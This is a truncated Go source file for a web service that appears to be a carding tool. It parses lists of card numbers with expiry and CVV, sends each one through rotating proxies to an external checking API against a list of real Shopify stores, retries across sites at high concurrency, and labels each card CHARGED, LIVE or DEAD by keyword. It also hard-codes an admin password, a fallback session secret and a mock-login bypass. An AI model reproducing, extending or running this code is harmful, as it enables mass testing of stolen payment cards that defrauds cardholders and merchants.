package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	_ "github.com/lib/pq"
)

const (
	DATA_DIR     = "data"
	SITES_FILE   = "data/sites.json"
	PROXIES_FILE = "data/proxies.json"
)

var DEFAULT_SHOPIFY_SITES = []string{
	"https://reston-lloyd.myshopify.com",
	"https://favorstoday.com",
	"https://happyhentreats.com",
	"https://shop.yorkspacesystems.com",
	"https://davids-toothpaste.myshopify.com",
}

type Card struct {
	CC        string `json:"cc"`
	MM        string `json:"mm"`
	YY        string `json:"yy"`
	CVV       string `json:"cvv"`
	Formatted string `json:"formatted"`
}

type CheckResult struct {
	Status    string `json:"status"`
	Msg       string `json:"msg"`
	Emoji     string `json:"emoji"`
	Price     string `json:"price"`
	Gateway   string `json:"gateway"`
	Site      string `json:"site"`
	ReceiptID string `json:"receipt_id"`
	Time      string `json:"time"`
	Card      string `json:"card"`
}

var (
	db             *sql.DB
	dbSitesCache   []string
	dbProxiesCache []string
	dbCacheTime    time.Time
	dbCacheMu      sync.RWMutex
	dbCacheTTL     = 5 * time.Minute

	recentSites      = make([]string, 0, 50)
	recentSitesMu    sync.Mutex
	recentProxies    = make([]string, 0, 50)
	recentProxiesMu  sync.Mutex

	fileLock sync.Mutex

	cardReg1 = regexp.MustCompile(`(\d{13,19})\s*[|/]\s*(\d{1,2})\s*[|/]\s*(\d{2,4})\s*[|/]\s*(\d{3,4})`)
	cardReg2 = regexp.MustCompile(`(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})`)

	chargedKeywords = []string{
		"charged", "charge success", "charge_success",
		"order complete", "order_complete", "order completed", "order_completed",
		"order confirmed", "order_confirmed",
		"order placed", "order_placed",
		"thank you", "thankyou", "thank_you",
		"captured", "capture_succeeded", "capture succeeded",
		"paid", "settled", "succeeded",
		"payment successful", "payment_successful", "payment success",
		"payment complete", "payment_complete", "payment_completed",
		"purchase complete", "purchase_complete",
		"transaction approved", "transaction_approved", "transaction successful",
		"transaction_successful",
		"sale approved", "sale_approved",
		"cnb", "amount_charged",
	}

	fraudKeywords      = []string{"fraud", "fraudulent", "high risk", "high_risk", "risk_review", "risk review", "suspicious", "do_not_honor", "do not honor", "pickup_card", "pickup card", "lost_card", "lost card", "stolen_card", "stolen card"}
	liveKeywords       = []string{"cvv", "ccn", "avs", "security code", "incorrect cvc", "incorrect_cvc", "cvc mismatch", "cvc_mismatch", "cvv mismatch", "cvv_mismatch", "avs mismatch", "avs_mismatch", "address mismatch", "address_mismatch", "zip code", "postal code", "billing address mismatch", "billing_address_mismatch"}
	lowBalanceKeywords = []string{"insufficient", "low balance", "low_balance", "funds", "not enough", "limit exceeded", "credit limit"}
	otpKeywords        = []string{"otp", "3d secure", "3d_secure", "3ds", "three_d_secure", "authentication required", "authentication_required", "requires_action", "requires action", "payer_action", "payer action", "payer_action_required", "redirect_to_3ds", "challenge", "vbv", "securecode", "sca_required", "sca required", "three d secure"}
	webErrorKeywords   = []string{
		"web_error", "shopify_web_error", "site_error", "gateway_error",
		"bad_request", "server_error", "internal_error", "temporarily_unavailable",
		"maintenance", "under_construction", "try_again_later",
		"detected_http", "detected_http_", "detected_bot", "bot_detected", "captcha",
		"cloudflare", "challenge_platform", "cf_chl", "js_challenge",
		"access_denied", "forbidden", "rate_limit", "too_many_requests",
		"waf", "firewall",
	}
	deadKeywords   = []string{"declined", "dead", "invalid", "failed", "rejected", "card declined", "card_declined", "generic decline", "generic_decline"}
	expiryKeywords = []string{
		"expired", "expiry", "expiration", "invalid month", "invalid year",
		"invalid date", "card expired", "card exp", "bad expiry", "bad expiration",
		"month invalid", "year invalid", "exp date", "exp month", "exp year",
	}
	noRetryStatuses = map[string]bool{
		"CHARGED":      true,
		"FRAUD":        true,
		"LIVE":         true,
		"DEAD":         true,
		"LOW_BALANCE":  true,
		"OTP_REQUIRED": true,
	}
)

func loadDotEnv() {
	file, err := os.Open(".env")
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) == 2 {
			k := strings.TrimSpace(parts[0])
			v := strings.TrimSpace(parts[1])
			if strings.HasPrefix(v, "\"") && strings.HasSuffix(v, "\"") {
				v = v[1 : len(v)-1]
			}
			if strings.HasPrefix(v, "'") && strings.HasSuffix(v, "'") {
				v = v[1 : len(v)-1]
			}
			os.Setenv(k, v)
		}
	}
}

func initDB() {
	dbURL := os.Getenv("DATABASE_URL")
	if dbURL == "" {
		log.Println("DATABASE_URL is empty. Database connection skipped.")
		return
	}
	var err error
	db, err = sql.Open("postgres", dbURL)
	if err != nil {
		log.Println("DB connection failed:", err)
		db = nil
		return
	}

	db.SetMaxOpenConns(20)
	db.SetMaxIdleConns(2)
	db.SetConnMaxLifetime(3 * time.Minute)

	if err := db.Ping(); err != nil {
		log.Println("DB ping failed:", err)
		db.Close()
		db = nil
		return
	}

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS sites (
			id SERIAL PRIMARY KEY,
			url TEXT UNIQUE NOT NULL
		);
		CREATE TABLE IF NOT EXISTS proxies (
			id SERIAL PRIMARY KEY,
			proxy TEXT UNIQUE NOT NULL
		);
		CREATE TABLE IF NOT EXISTS web_login_tokens (
			token TEXT PRIMARY KEY,
			user_id BIGINT NOT NULL,
			username TEXT,
			first_name TEXT,
			expiry TIMESTAMP WITH TIME ZONE NOT NULL
		);
	`)
	if err != nil {
		log.Println("DB table creation failed:", err)
	}
}

func getSessionUser(r *http.Request) (int64, string, bool) {
	sessionData := getSession(r)
	if sessionData == nil {
		return 0, "", false
	}
	
	var uID int64
	if val := sessionData["user_id"]; val != nil {
		switch v := val.(type) {
		case float64:
			uID = int64(v)
		case int64:
			uID = v
		case int:
			uID = int64(v)
		}
	}
	
	var user string
	if val := sessionData["user"]; val != nil {
		if s, ok := val.(string); ok {
			user = s
		}
	}
	
	var admin bool
	if val := sessionData["admin"]; val != nil {
		if b, ok := val.(bool); ok {
			admin = b
		}
	}
	
	return uID, user, admin
}

func getSitesFromDB(userID int64, isAdmin bool) []string {
	if db == nil {
		return DEFAULT_SHOPIFY_SITES
	}

	if isAdmin || userID == 6071715158 {
		rows, err := db.Query("SELECT DISTINCT url FROM sites ORDER BY url")
		if err != nil {
			log.Println("DB query failed for global sites:", err)
			return DEFAULT_SHOPIFY_SITES
		}
		defer rows.Close()

		var sites []string
		for rows.Next() {
			var u string
			if err := rows.Scan(&u); err == nil && u != "" {
				sites = append(sites, u)
			}
		}
		if len(sites) == 0 {
			return DEFAULT_SHOPIFY_SITES
		}
		return sites
	}

	var privateSitesJSON []byte
	err := db.QueryRow("SELECT private_sites FROM users WHERE user_id = $1", userID).Scan(&privateSitesJSON)
	if err != nil {
		if err != sql.ErrNoRows {
			log.Println("DB query failed for private_sites:", err)
		}
		return DEFAULT_SHOPIFY_SITES
	}

	if len(privateSitesJSON) == 0 || string(privateSitesJSON) == "null" {
		return DEFAULT_SHOPIFY_SITES
	}

	var sites []string
	if err := json.Unmarshal(privateSitesJSON, &sites); err != nil {
		log.Println("JSON unmarshal failed for private_sites:", err)
		return DEFAULT_SHOPIFY_SITES
	}

	if len(sites) == 0 {
		return DEFAULT_SHOPIFY_SITES
	}
	return sites
}

func getProxiesFromDB(userID int64, isAdmin bool) []string {
	if db == nil {
		return nil
	}

	if isAdmin || userID == 6071715158 {
		rows, err := db.Query("SELECT DISTINCT proxy FROM proxies ORDER BY proxy")
		if err != nil {
			log.Println("DB query failed for global proxies:", err)
			return nil
		}
		defer rows.Close()

		var proxies []string
		for rows.Next() {
			var p string
			if err := rows.Scan(&p); err == nil && p != "" {
				proxies = append(proxies, p)
			}
		}
		return proxies
	}

	var privateProxiesJSON []byte
	err := db.QueryRow("SELECT private_proxies FROM users WHERE user_id = $1", userID).Scan(&privateProxiesJSON)
	if err != nil {
		if err != sql.ErrNoRows {
			log.Println("DB query failed for private_proxies:", err)
		}
		return nil
	}

	if len(privateProxiesJSON) == 0 || string(privateProxiesJSON) == "null" {
		return nil
	}

	var proxies []string
	if err := json.Unmarshal(privateProxiesJSON, &proxies); err != nil {
		log.Println("JSON unmarshal failed for private_proxies:", err)
		return nil
	}

	return proxies
}

func loadFile(path string) []string {
	fileLock.Lock()
	defer fileLock.Unlock()
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()
	var data []string
	if err := json.NewDecoder(file).Decode(&data); err != nil {
		return nil
	}
	return data
}

func saveFile(path string, data []string) {
	fileLock.Lock()
	defer fileLock.Unlock()
	file, err := os.Create(path)
	if err != nil {
		log.Println("Failed to create file:", err)
		return
	}
	defer file.Close()
	json.NewEncoder(file).Encode(data)
}

func getSites(userID int64, isAdmin bool) []string {
	dbSites := getSitesFromDB(userID, isAdmin)
	fileSites := loadFile(SITES_FILE)

	seen := make(map[string]bool)
	var combined []string
	for _, s := range dbSites {
		if s != "" && !seen[s] {
			seen[s] = true
			combined = append(combined, s)
		}
	}
	for _, s := range fileSites {
		if s != "" && !seen[s] {
			seen[s] = true
			combined = append(combined, s)
		}
	}
	if len(combined) == 0 {
		return append([]string(nil), DEFAULT_SHOPIFY_SITES...)
	}
	return combined
}

func getProxies(userID int64, isAdmin bool) []string {
	dbProxies := getProxiesFromDB(userID, isAdmin)
	fileProxies := loadFile(PROXIES_FILE)

	seen := make(map[string]bool)
	var combined []string
	for _, p := range dbProxies {
		if p != "" && !seen[p] {
			seen[p] = true
			combined = append(combined, p)
		}
	}
	for _, p := range fileProxies {
		if p != "" && !seen[p] {
			seen[p] = true
			combined = append(combined, p)
		}
	}
	return combined
}

func pickRandomSite(sites []string) string {
	if len(sites) == 0 {
		return ""
	}
	recentSitesMu.Lock()
	defer recentSitesMu.Unlock()

	var available []string
	for _, s := range sites {
		recent := false
		for _, r := range recentSites {
			if r == s {
				recent = true
				break
			}
		}
		if !recent {
			available = append(available, s)
		}
	}

	if len(available) == 0 {
		recentSites = nil
		available = sites
	}

	choice := available[rand.Intn(len(available))]
	recentSites = append(recentSites, choice)
	if len(recentSites) > 50 {
		recentSites = recentSites[1:]
	}
	return choice
}

func pickRandomProxy(proxies []string) string {
	if len(proxies) == 0 {
		return ""
	}
	recentProxiesMu.Lock()
	defer recentProxiesMu.Unlock()

	var available []string
	for _, p := range proxies {
		recent := false
		for _, r := range recentProxies {
			if r == p {
				recent = true
				break
			}
		}
		if !recent {
			available = append(available, p)
		}
	}

	if len(available) == 0 {
		recentProxies = nil
		available = proxies
	}

	choice := available[rand.Intn(len(available))]
	recentProxies = append(recentProxies, choice)
	if len(recentProxies) > 50 {
		recentProxies = recentProxies[1:]
	}
	return choice
}

func formatProxyForAPI(proxyRaw string) string {
	clean := strings.TrimSpace(proxyRaw)
	if clean == "" {
		return ""
	}
	if strings.Contains(clean, "://") {
		parts := strings.SplitN(clean, "://", 2)
		clean = parts[1]
	}
	if strings.Contains(clean, "@") {
		return clean
	}
	parts := strings.Split(clean, ":")
	if len(parts) == 4 {
		ip, port, user, passwd := parts[0], parts[1], parts[2], parts[3]
		return fmt.Sprintf("%s:%s@%s:%s", user, passwd, ip, port)
	}
	return clean
}

func parseCards(text string) []Card {
	var cards []Card
	lines := strings.Split(text, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		line = regexp.MustCompile(`\s+`).ReplaceAllString(line, " ")

		if m := cardReg1.FindStringSubmatch(line); m != nil {
			cc := m[1]
			mm := fmt.Sprintf("%02s", m[2])
			if len(mm) > 2 {
				mm = mm[len(mm)-2:]
			}
			yy := m[3]
			if len(yy) > 2 {
				yy = yy[len(yy)-2:]
			}
			cvv := m[4]
			cards = append(cards, Card{
				CC:        cc,
				MM:        mm,
				YY:        yy,
				CVV:       cvv,
				Formatted: fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv),
			})
			continue
		}

		if m := cardReg2.FindStringSubmatch(line); m != nil {
			cc := m[1]
			mm := fmt.Sprintf("%02s", m[2])
			if len(mm) > 2 {
				mm = mm[len(mm)-2:]
			}
			yy := m[3]
			if len(yy) > 2 {
				yy = yy[len(yy)-2:]
			}
			cvv := m[4]
			cards = append(cards, Card{
				CC:        cc,
				MM:        mm,
				YY:        yy,
				CVV:       cvv,
				Formatted: fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv),
			})
		}
	}
	return cards
}

func classifyResponse(apiResponse string) (string, string) {
	raw := strings.ToLower(strings.TrimSpace(apiResponse))
	combined := strings.ReplaceAll(strings.ReplaceAll(raw, "_", " "), "-", " ")

	for _, k := range chargedKeywords {
		if strings.Contains(combined, k) {
			return "CHARGED", "🔥"
		}
	}
	for _, k := range fraudKeywords {
		if strings.Contains(raw, k) {
			return "FRAUD", "⚠️"
		}
	}
	for _, k := range liveKeywords {
		if strings.Contains(raw, k) {
			return "LIVE", "✅"
		}
	}
	for _, k := range lowBalanceKeywords {
		if strings.Contains(raw, k) {
			return "LOW_BALANCE", "🎆"
		}
	}
	for _, k := range otpKeywords {
		if strings.Contains(raw, k) {
			return "OTP_REQUIRED", "✅"
		}
	}

	if strings.Contains(combined, "approved") || strings.Contains(combined, "authorized") || strings.Contains(combined, "authorised") {
		if !strings.Contains(combined, "not approved") && !strings.Contains(combined, "unapproved") && !strings.Contains(combined, "not authorized") && !strings.Contains(combined, "declined") {
			return "LIVE", "✅"
		}
	}

	for _, k := range webErrorKeywords {
		if strings.Contains(raw, k) {
			return "ERROR", "⚠️"
		}
	}
	for _, k := range deadKeywords {
		if strings.Contains(raw, k) {
			return "DEAD", "❌"
		}
	}
	if strings.Contains(raw, "error") {
		return "ERROR", "⚠️"
	}
	return "UNKNOWN", "⚠️"
}

func isExpiryError(msg string) bool {
	m := strings.ToLower(msg)
	for _, k := range expiryKeywords {
		if strings.Contains(m, k) {
			return true
		}
	}
	return false
}

func doCheck(client *http.Client, sacAPI string, card Card, site string, proxyRaw string) CheckResult {
	cc := card.Formatted
	proxyConverted := formatProxyForAPI(proxyRaw)

	urlStr := fmt.Sprintf("%s/mlsn?cc=%s&site=%s", sacAPI, url.QueryEscape(cc), url.QueryEscape(site))
	if proxyConverted != "" {
		urlStr += fmt.Sprintf("&proxy=%s", url.QueryEscape(proxyConverted))
	}

	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}

	resp, err := client.Do(req)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return CheckResult{Status: "TIMEOUT", Msg: "Request Timeout (90s)", Emoji: "⏰", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
		}
		return CheckResult{Status: "EXCEPTION", Msg: err.Error(), Emoji: "🔥", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}

	var raw map[string]interface{}
	if err := json.Unmarshal(bodyBytes, &raw); err != nil {
		text := string(bodyBytes)
		text = regexp.MustCompile(`<[^>]+>`).ReplaceAllString(text, "")
		text = strings.TrimSpace(text)
		if len(text) > 200 {
			text = text[:200]
		}
		return CheckResult{Status: "ERROR", Msg: text, Emoji: "⚠️", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}

	getString := func(m map[string]interface{}, keys ...string) string {
		for _, k := range keys {
			if val, ok := m[k]; ok && val != nil {
				return fmt.Sprintf("%v", val)
			}
		}
		return ""
	}

	apiResponse := getString(raw, "Response", "response", "message")
	priceRaw := getString(raw, "Price", "price", "amount")
	currency := getString(raw, "Currency", "currency")
	checkTime := getString(raw, "Time", "time", "elapsed")
	gateway := getString(raw, "Gateway", "gateway", "Gate")
	if gateway == "" {
		gateway = "Shopify Payments"
	}
	receiptID := getString(raw, "receipt_id", "Receipt ID", "receipt_ID")
	if receiptID == "" {
		receiptID = "N/A"
	}

	status, emoji := classifyResponse(apiResponse)

	if status == "UNKNOWN" && apiResponse != "" {
		apiStatus := getString(raw, "Status", "status")
		if apiStatus == "false" || apiStatus == "False" {
			status = "ERROR"
			emoji = "⚠️"
		}
	}

	formattedPrice := "-"
	if priceRaw != "" && priceRaw != "-" {
		if f, err := strconv.ParseFloat(priceRaw, 64); err == nil {
			if currency != "" {
				formattedPrice = fmt.Sprintf("%.2f %s", f, currency)
			} else {
				formattedPrice = fmt.Sprintf("$%.2f", f)
			}
		} else {
			if currency != "" {
				formattedPrice = fmt.Sprintf("%s %s", priceRaw, currency)
			} else {
				formattedPrice = priceRaw
			}
		}
	}

	return CheckResult{
		Status:    status,
		Msg:       apiResponse,
		Emoji:     emoji,
		Price:     formattedPrice,
		Gateway:   gateway,
		Site:      site,
		ReceiptID: receiptID,
		Time:      checkTime,
	}
}

func checkCard(client *http.Client, sacAPI string, card Card, sites []string, proxies []string) CheckResult {
	var lastResult CheckResult
	for attempt := 0; attempt < 5; attempt++ {
		site := pickRandomSite(sites)
		proxy := pickRandomProxy(proxies)
		result := doCheck(client, sacAPI, card, site, proxy)
		lastResult = result

		if noRetryStatuses[result.Status] {
			return result
		}
		if result.Status == "ERROR" && isExpiryError(result.Msg) {
			return result
		}
		if result.Status != "ERROR" && result.Status != "TIMEOUT" && result.Status != "EXCEPTION" && result.Status != "UNKNOWN" {
			return result
		}
	}
	return lastResult
}

func checkCardsBatch(client *http.Client, sacAPI string, cards []Card, sites []string, proxies []string, concurrency int) []CheckResult {
	if concurrency <= 0 {
		concurrency = 1000
	}
	sem := make(chan struct{}, concurrency)
	results := make([]CheckResult, len(cards))

	var wg sync.WaitGroup
	for i, card := range cards {
		wg.Add(1)
		go func(index int, c Card) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			res := checkCard(client, sacAPI, c, sites, proxies)
			res.Card = c.Formatted
			results[index] = res
		}(i, card)
	}
	wg.Wait()
	return results
}

func signSession(payload string, secret []byte) string {
	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(payload))
	signature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return base64.RawURLEncoding.EncodeToString([]byte(payload)) + "." + signature
}

func verifySession(token string, secret []byte) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 2 {
		return "", errors.New("invalid token")
	}
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", err
	}
	mac := hmac.New(sha256.New, secret)
	mac.Write(payloadBytes)
	expectedSignature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	if parts[1] != expectedSignature {
		return "", errors.New("invalid signature")
	}
	return string(payloadBytes), nil
}

func setSession(w http.ResponseWriter, sessionData map[string]interface{}) {
	payloadBytes, _ := json.Marshal(sessionData)
	secretKey := os.Getenv("SECRET_KEY")
	if secretKey == "" {
		secretKey = "mlsn-web-checker-secret"
	}
	token := signSession(string(payloadBytes), []byte(secretKey))
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
	})
}

func getSession(r *http.Request) map[string]interface{} {
	cookie, err := r.Cookie("session")
	if err != nil {
		return nil
	}
	secretKey := os.Getenv("SECRET_KEY")
	if secretKey == "" {
		secretKey = "mlsn-web-checker-secret"
	}
	payload, err := verifySession(cookie.Value, []byte(secretKey))
	if err != nil {
		return nil
	}
	var sessionData map[string]interface{}
	json.Unmarshal([]byte(payload), &sessionData)
	return sessionData
}

func requireLogin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		allowedRoutes := []string{
			"/login",
			"/api/login/telegram",
			"/api/login/admin",
			"/api/login/mock",
		}

		path := r.URL.Path
		if strings.HasPrefix(path, "/static/") || strings.HasPrefix(path, "/assets/") {
			next(w, r)
			return
		}

		isAllowed := false
		for _, route := range allowedRoutes {
			if path == route {
				isAllowed = true
				break
			}
		}
		if isAllowed {
			next(w, r)
			return
		}

		sessionData := getSession(r)
		var user interface{}
		var admin interface{}
		if sessionData != nil {
			user = sessionData["user"]
			admin = sessionData["admin"]
		}

		isLoggedIn := user != nil && user != "" || admin == true

		if !isLoggedIn {
			http.Redirect(w, r, "/login?next="+url.QueryEscape(path), http.StatusFound)
			return
		}

		if strings.HasPrefix(path, "/vanlinh") && admin != true {
			http.Redirect(w, r, "/login?admin=1&next="+url.QueryEscape(path), http.StatusFound)
			return
		}

		next(w, r)
	}
}

func requireAdmin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionData := getSession(r)
		var admin interface{}
		if sessionData != nil {
			admin = sessionData["admin"]
		}

		if admin != true {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusForbidden)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Forbidden: Admin access required"})
			return
		}
		next(w, r)
	}
}

func verifyTelegramAuth(authData map[string]string, botToken string) bool {
	checkHash := authData["hash"]
	if checkHash == "" || botToken == "" {
		return false
	}

	authDateStr := authData["auth_date"]
	authDate, err := strconv.ParseInt(authDateStr, 10, 64)
	if err != nil || time.Now().Unix()-authDate > 86400 {
		return false
	}

	var keys []string
	for k := range authData {
		if k != "hash" {
			keys = append(keys, k)
		}
	}
	sort.Strings(keys)

	var dataList []string
	for _, k := range keys {
		dataList = append(dataList, fmt.Sprintf("%s=%s", k, authData[k]))
	}
	dataCheckString := strings.Join(dataList, "\n")

	h := sha256.New()
	h.Write([]byte(botToken))
	secretKey := h.Sum(nil)

	mac := hmac.New(sha256.New, secretKey)
	mac.Write([]byte(dataCheckString))
	computedHash := hex.EncodeToString(mac.Sum(nil))

	return computedHash == checkHash
}

type PendingLogin struct {
	ID        int64
	Username  string
	FirstName string
	Expiry    time.Time
}

func isTelegramUserAllowed(userID int64) bool {
	if db == nil {
		if os.Getenv("TELEGRAM_BOT_TOKEN") == "" {
			return true
		}
		return false
	}
	
	var exists bool
	err := db.QueryRow("SELECT EXISTS(SELECT 1 FROM allowed_users WHERE user_id = $1)", userID).Scan(&exists)
	if err == nil && exists {
		return true
	}
	
	err = db.QueryRow("SELECT EXISTS(SELECT 1 FROM users WHERE user_id = $1)", userID).Scan(&exists)
	if err == nil && exists {
		return true
	}
	
	return false
}

func apiLoginTokenHandler(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		http.Error(w, "Token is required", http.StatusBadRequest)
		return
	}

	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	var pending PendingLogin
	err := db.QueryRow("SELECT user_id, username, first_name, expiry FROM web_login_tokens WHERE token = $1", token).Scan(&pending.ID, &pending.Username, &pending.FirstName, &pending.Expiry)
	
	if err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "Invalid or expired login link", http.StatusUnauthorized)
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	// Update token expiry to 15 seconds from now if it is not already set to a short duration.
	// This provides a grace period to handle Telegram's link preview crawlers making double requests.
	graceExpiry := time.Now().Add(15 * time.Second)
	if pending.Expiry.Sub(time.Now()) > 20*time.Second {
		_, _ = db.Exec("UPDATE web_login_tokens SET expiry = $1 WHERE token = $2", graceExpiry, token)
	}

	if time.Now().After(pending.Expiry) {
		_, _ = db.Exec("DELETE FROM web_login_tokens WHERE token = $1", token)
		http.Error(w, "Login link has expired", http.StatusUnauthorized)
		return
	}

	user := pending.Username
	if user == "" {
		user = pending.FirstName
	}
	if user == "" {
		user = fmt.Sprintf("tg_%d", pending.ID)
	}

	uLower := strings.ToLower(user)
	isAdminUser := uLower == "vanlinhcute" || uLower == "hthcte" || uLower == "@hthcte"

	// Enforce database-based access control for non-admins
	if !isAdminUser && !isTelegramUserAllowed(pending.ID) {
		http.Error(w, "Access Denied: You are not authorized to use this checker. Please register/add via the Telegram bot.", http.StatusForbidden)
		return
	}

	sessionData := map[string]interface{}{
		"user":    user,
		"user_id": pending.ID,
	}
	
	if isAdminUser {
		sessionData["admin"] = true
	}

	setSession(w, sessionData)
	http.Redirect(w, r, "/", http.StatusFound)
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "frontend/dist/index.html")
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "frontend/dist/index.html")
}

func vanlinhHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "frontend/dist/index.html")
}

func apiLoginAdminHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var reqData struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	username := strings.TrimSpace(reqData.Username)
	password := strings.TrimSpace(reqData.Password)

	if username == "vanlinhcute" && password == "gaidepknoinhieu" {
		sessionData := map[string]interface{}{
			"user":  "vanlinhcute",
			"admin": true,
		}
		setSession(w, sessionData)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":  true,
			"redirect": "/vanlinh",
		})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusUnauthorized)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"error": "Incorrect credentials",
	})
}

func apiLoginTelegramHandler(w http.ResponseWriter, r *http.Request) {
	queryParams := r.URL.Query()
	authData := make(map[string]string)
	for k, v := range queryParams {
		if len(v) > 0 {
			authData[k] = v[0]
		}
	}

	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	if botToken != "" {
		if verifyTelegramAuth(authData, botToken) {
			user := authData["username"]
			if user == "" {
				user = authData["first_name"]
			}
			if user == "" {
				user = authData["id"]
			}
			var uID int64
			if idStr, exists := authData["id"]; exists {
				uID, _ = strconv.ParseInt(idStr, 10, 64)
			}
			sessionData := map[string]interface{}{
				"user":    user,
				"user_id": uID,
			}
			setSession(w, sessionData)
			http.Redirect(w, r, "/", http.StatusFound)
			return
		} else {
			http.Error(w, "Telegram authentication failed.", http.StatusUnauthorized)
			return
		}
	} else {
		user := authData["username"]
		if user == "" {
			user = authData["first_name"]
		}
		if user == "" {
			user = "test_user"
		}
		var uID int64
		if idStr, exists := authData["id"]; exists {
			uID, _ = strconv.ParseInt(idStr, 10, 64)
		}
		sessionData := map[string]interface{}{
			"user":    user,
			"user_id": uID,
		}
		setSession(w, sessionData)
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}
}

func apiLoginMockHandler(w http.ResponseWriter, r *http.Request) {
	if os.Getenv("TELEGRAM_BOT_TOKEN") != "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": "Mock login is disabled in production",
		})
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var reqData struct {
		Username string `json:"username"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	username := strings.TrimSpace(reqData.Username)
	if username == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": "Username is empty",
		})
		return
	}
	sessionData := map[string]interface{}{
		"user": username,
	}
	setSession(w, sessionData)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":  true,
		"redirect": "/",
	})
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		MaxAge:   -1,
	})
	http.Redirect(w, r, "/login", http.StatusFound)
}

func apiStatsHandler(w http.ResponseWriter, r *http.Request) {
	userID, username, isAdmin := getSessionUser(r)
	isLoggedIn := userID != 0 || username != "" || isAdmin

	sc := 0
	pc := 0

	if isLoggedIn {
		userSites := loadFile(SITES_FILE)
		userProxies := loadFile(PROXIES_FILE)

		if len(userSites) > 0 {
			sc = len(userSites)
		} else {
			sc = len(getSitesFromDB(userID, isAdmin))
		}

		if len(userProxies) > 0 {
			pc = len(userProxies)
		} else {
			pc = len(getProxiesFromDB(userID, isAdmin))
		}
	}

	sacAPI := os.Getenv("SAC_API")
	if sacAPI == "" {
		sacAPI = "https://sac-1-qg37.onrender.com"
	}

	botUsername := os.Getenv("TELEGRAM_BOT_USERNAME")

	sessionUser := username

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"sites_count":   sc,
		"proxies_count": pc,
		"api_url":       sacAPI,
		"bot_username":  botUsername,
		"authenticated": isLoggedIn,
		"user":          sessionUser,
	})
}

func apiCheckBatchHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Cards       []Card      `json:"cards"`
		Proxies     []string    `json:"proxies"`
		Concurrency interface{} `json:"concurrency"`
		Semaphore   interface{} `json:"semaphore"`
	}
